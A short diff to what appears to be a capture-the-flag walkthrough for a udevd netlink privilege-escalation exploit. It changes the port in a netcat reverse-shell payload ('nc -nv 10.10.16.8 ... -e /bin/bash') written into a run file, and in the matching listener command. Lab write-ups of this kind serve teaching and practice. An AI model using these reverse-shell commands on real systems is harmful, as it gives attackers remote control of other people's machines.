@@ -759,13 +759,13 @@ Next, create a `run` file in `/tmp` and add a reverse shell to it.
 
 ```
 echo '#!/bin/bash' > run
-echo 'nc -nv 10.10.16.8 4445 -e /bin/bash' >> run
+echo 'nc -nv 10.10.16.8 5555 -e /bin/bash' >> run
 ```
 
 Set up a listener on your attack machine to receive the reverse shell.
 
 ```
-nc -nlvp 4445
+nc -nlvp 5555
 ```
 Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.
 
